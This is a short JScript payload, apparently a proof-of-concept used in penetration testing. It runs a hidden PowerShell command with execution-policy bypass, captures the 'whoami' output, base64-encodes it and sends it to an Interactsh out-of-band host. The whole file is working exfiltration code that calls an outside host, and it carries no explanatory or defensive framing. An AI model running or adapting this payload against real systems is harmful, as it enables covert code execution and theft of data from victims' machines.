// DNS Exfiltration - whoami via PowerShell + Interactsh
var shell = new ActiveXObject("WScript.Shell");
var cmd = 'powershell -nop -exec bypass -c "whoami | % { $_.Replace(\"\\\"\", \"\") } | Out-File -Encoding ascii C:\\temp\\whoami.txt; $content = Get-Content C:\\temp\\whoami.txt -Raw; $encoded = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($content)); $url = ''http://rnjfqzizxajevsjjzcfew5oiup9b1ok72.oast.fun/'' + $encoded; Invoke-WebRequest -Uri $url -UseBasicParsing"';

shell.Run(cmd, 0, false);
